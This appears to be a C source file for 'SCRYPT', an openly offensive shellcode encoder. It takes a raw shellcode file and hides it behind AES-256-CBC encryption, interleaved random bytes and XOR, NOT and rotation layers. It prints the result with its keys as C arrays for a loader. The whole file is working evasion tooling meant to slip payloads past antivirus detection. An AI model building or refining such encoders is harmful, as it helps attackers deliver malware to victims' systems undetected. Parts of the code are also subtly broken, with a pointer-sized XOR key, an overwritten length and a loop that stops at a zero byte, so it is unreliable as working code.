#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

#define RED "\x1b[01;31m"
#define GRE "\x1b[01;32m"
#define YEL "\x1b[01;33m"
#define BLU "\x1b[01;34m"
#define MAG "\x1b[01;35m"
#define CYA "\x1b[01;36m"
#define RES "\x1b[0m"

int main(int argc, char * argv[]) {
        srand((unsigned int) time(NULL));
        if (argc != 2) {
                printf("Usage: %s <shellcode_file>\n", argv[0]);
                return 1;
        }

        FILE * file = fopen(argv[1], "rb");
        if (!file) {
                perror("Error opening file");
                return 1;
        }

        fseek(file, 0, SEEK_END);
        int file_size = ftell(file);
        fseek(file, 0, SEEK_SET);

        unsigned char shellcode[file_size + 1];
        fread(shellcode, 1, file_size, file);
        fclose(file);
        shellcode[file_size] = '\0';

        printf(BLU "[ SCRYPT ]\n"
                YEL "~> "
                GRE "Made by: "
                MAG "github.com/9xN\n"
                RED "----------------------------"
                RES "\n"
                CYA "ENCODING SHELLCODE...\n");

        int ROT = rand() % 8 + 1, DEC = rand() & 0xff, kk = 0, ll = 0, l = 0, k = 0, i;
        unsigned char * key = (unsigned char * ) malloc(sizeof(unsigned char) * EVP_MAX_KEY_LENGTH);
        unsigned char * iv = (unsigned char * ) malloc(sizeof(unsigned char) * EVP_MAX_IV_LENGTH);
        unsigned char * ciphertext = (unsigned char * ) malloc(sizeof(unsigned char) * (file_size + EVP_MAX_BLOCK_LENGTH));
        EVP_CIPHER_CTX * ctx = EVP_CIPHER_CTX_new();

        RAND_bytes(key, EVP_MAX_KEY_LENGTH);
        RAND_bytes(iv, EVP_MAX_IV_LENGTH);

        EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
        EVP_EncryptUpdate(ctx, ciphertext, & file_size, shellcode, file_size);
        EVP_EncryptFinal_ex(ctx, ciphertext + file_size, & kk);
        EVP_CIPHER_CTX_free(ctx);

        unsigned char XORKEY[sizeof(ciphertext)];
        for (i = 0; i < sizeof(ciphertext); i++) {
                XORKEY[i] = rand() & 0xff;
        }

        unsigned char * buffer = (unsigned char * ) malloc(sizeof(unsigned char));
        unsigned char * shellcode2 = (unsigned char * ) malloc(sizeof(char * ) * (((file_size) * 2) / 8));
        memset(shellcode2, '\0', sizeof(char * ) * (((file_size) * 2) / 8));
        unsigned char shellcode3[] = "\xbb";
        unsigned char * shellcode4 = (unsigned char * ) malloc(sizeof(char * ) * (((file_size) * 2) / 8));
        memset(shellcode4, '\0', sizeof(char * ) * (((file_size) * 2) / 8));

        for (i = 0; i < ((file_size) * 2); i++) {
                buffer[0] = rand() & 0xff;
                memcpy( & shellcode3[0], (char * ) & buffer[0], sizeof(buffer[0]));
                k = i % 2;
                if (k == 0) {
                        shellcode2[i] = ciphertext[l];
                        l++;
                } else if (k != 0) {
                        shellcode2[i] = shellcode3[0];
                }
        }

        buffer[0] = rand() & 0xff;

        for (i = 0; i < (file_size) * 2; i++) {
                if (kk == sizeof(XORKEY)) kk = 0;
                shellcode2[i] = shellcode2[i] ^ XORKEY[kk];
                shellcode2[i] = shellcode2[i] ^ buffer[0];
                shellcode2[i] = shellcode2[i] - DEC;
                shellcode2[i] = ~shellcode2[i];
                shellcode2[i] = (shellcode2[i] << ROT) | (shellcode2[i] >> sizeof(shellcode2[i]) * (8 - ROT));

                if (shellcode2[i] == 0) {
                        ll++;
                        break;
                }

                kk++;
        }

        for (i = 0; i < (file_size) * 2; i++) {
                memcpy( & shellcode4[i], (unsigned char * ) & shellcode2[i], sizeof(shellcode2[i]));
        }

        printf(CYA "SHELLCODE ENCODED:"
                RES "\n"
                BLU "[+]"
                GRE " Shellcode Length: "
                RED "%d "
                YEL "~> "
                RED "%d\n", file_size, (file_size) * 2);
        printf(
                MAG "unsigned char"
                RES " shellcode[]"
                YEL " = "
                RES "{ ");
        for (i = 0; i < (file_size) * 2; i++) {
                printf(RED "0x%02x%s", shellcode4[i], i == (file_size) * 2 - 1 ? RES " };\n" : ", ");
        }
        printf(
                MAG "unsigned char"
                RES " key[]"
                YEL " = "
                RES "{ ");
        for (i = 0; i < EVP_MAX_KEY_LENGTH; i++) {
                printf(RED "0x%02x%s", key[i], i == EVP_MAX_KEY_LENGTH - 1 ? RES " };\n" : ", ");
        }

        printf(
                MAG "unsigned char"
                RES " iv[]"
                YEL " = "
                RES "{ ");
        for (i = 0; i < EVP_MAX_IV_LENGTH; i++) {
                printf(RED "0x%02x%s", iv[i], i == EVP_MAX_IV_LENGTH - 1 ? RES " };\n" : ", ");
        }

        printf(
                MAG "unsigned char"
                RES " xorkey[]"
                YEL " = "
                RES "{ ");
        for (i = 0; i < sizeof(XORKEY); i++) {
                printf(RED "0x%02x%s", XORKEY[i], i == sizeof(XORKEY) - 1 ? RES " };\n" : ", ");
        }
        printf(
                MAG "int"
                RES " ROT"
                YEL " = "
                RED "%d"
                RES ";\n", ROT);
        printf(
                MAG "int"
                RES " DEC"
                YEL " = "
                RED "%d"
                RES ";\n", DEC);
        printf(
                MAG "#define"
                RES " MBYTE "
                RED "0x%02x"
                RES ";\n", buffer[0]);
        free(key);
        free(iv);
        free(ciphertext);
        free(buffer);
        free(shellcode2);
        free(shellcode4);

        return 0;
}